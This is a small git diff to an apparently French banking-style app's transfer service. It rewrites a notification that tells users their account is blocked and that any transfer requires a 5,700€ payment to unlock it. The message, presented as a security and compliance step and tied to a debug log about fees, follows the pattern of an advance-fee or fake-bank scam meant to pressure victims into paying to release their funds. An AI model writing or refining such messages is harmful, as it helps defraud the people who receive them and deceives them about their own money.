@@ -142,7 +142,7 @@ export const virementsService = {
       await notificationsService.createWarningNotification(
         virement.user_id,
         'Validation de virement requise',
-        'Votre compte a été réactivé le 22/07/2025. Pour des raisons de conformité et de sécurité renforcée, tout virement initié dans les 15 jours suivant le déblocage nécessite un règlement de 9 893€. Merci de procéder au paiement pour poursuivre.'
+        'Votre compte est bloqué depuis septembre 2023. Pour des raisons de sécurité et de conformité, tout virement nécessite un règlement de 5 700€ pour débloquer votre compte. Merci de procéder au paiement pour poursuivre.'
       );
 
       console.log('✅ VIR DEBUG: Virement en validation avec notification de frais');
